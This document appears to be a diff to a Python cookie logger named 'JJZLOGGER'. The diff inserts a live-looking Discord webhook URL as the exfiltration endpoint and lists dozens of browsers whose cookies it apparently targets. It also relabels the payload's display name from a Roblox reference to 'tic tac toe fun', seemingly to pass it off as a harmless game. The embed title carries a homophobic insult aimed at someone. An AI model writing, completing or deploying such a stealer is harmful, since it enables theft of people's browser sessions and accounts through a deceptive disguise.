@@ -9,7 +9,7 @@ import os
 import re
 from pathlib import Path
 
-webhook = ""
+webhook = "https://discord.com/api/webhooks/1170869253310787614/ef0FnMFs9_bHcTxc9xYfooMMcO-YstFZKsSqc0v9S6533ZYdtkwmuY_SQ84jTbWxbQNM"
 
 cookies = ['firefox', 'chrome', 'chromium', 'edge', 'opera', 'vivaldi', 'brave', 'yandex', 'torch', 'maxthon', 'iridium', 'comodo', 'seamonkey', 'palemoon', 'waterfox', 'basilisk', 'safari', 'internet explorer', 'netscape', 'avant browser', 'camino', 'flock', 'galeon', 'k-meleon', 'lynx', 'midori', 'mosaic', 'nokia browser', 'omniweb', 'puffin', 'rockmelt', 'slimjet', 'srware iron', 'uc browser', 'webtv', 'whale', 'yuzu', 'zohocorp', '360 secure browser', 'amigo', 'apache', 'apple webkit', 'arora', 'beaker browser', 'blisk', 'browzar', 'citrio', 'coccoc', 'colibri', 'coolnovo', 'cyberfox', 'deepnet explorer', 'dillo', 'dooble', 'dorothy browser', 'epic browser', 'fennec', 'flock', 'fluid', 'gnome web', 'googlebot', 'google earth', 'hotjava', 'iceape', 'icecat', 'iceweasel', 'jack', 'kazehakase', 'kipi', 'k-meleon goanna', 'konqueror', 'leopard webkit', 'links', 'lunascape', 'microsoft edge mobile', 'microsoft webmatrix', 'min', 'minimo', 'minuet', 'mozilla suite', 'netsurf', 'nutscrape', 'omniweb', 'orca browser', 'phoenix', 'pogo', 'qutebrowser', 'qtweb', 'rockmelt', 'salamweb', 'samsung internet', 'shiira', 'songbird', 'surf', 'swiftfox', 'tenfourfox', 'the world browser', 'uzbl', 'vortex', 'web', 'webian shell', 'webpositive', 'wget', 'wxweb', 'xombrero', 'yellow', 'avast', 'tor']
 
@@ -48,12 +48,12 @@ data = {
     "embeds": [
         {
             "title": "USM IS GAY - JJZLOGGER",
-            "url": "https://pornhub.com",
+            "url": "https://tse2.mm.bing.net/th?id=OIP.gANbm83scul5xfm8BAmuvgHaHa&pid=Api&P=0&h=220",
             "description": "",
             "color": 3447704,
-            "thumbnail": {"url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"},
+            "thumbnail": {"url": "https://tse2.mm.bing.net/th?id=OIP.gANbm83scul5xfm8BAmuvgHaHa&pid=Api&P=0&h=220"},
             "author": {
-                "name": "Roblox Shit ig lmao idfk",
+                "name": "tic tac toe fun",
                 "icon_url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"
             },
             "fields": [
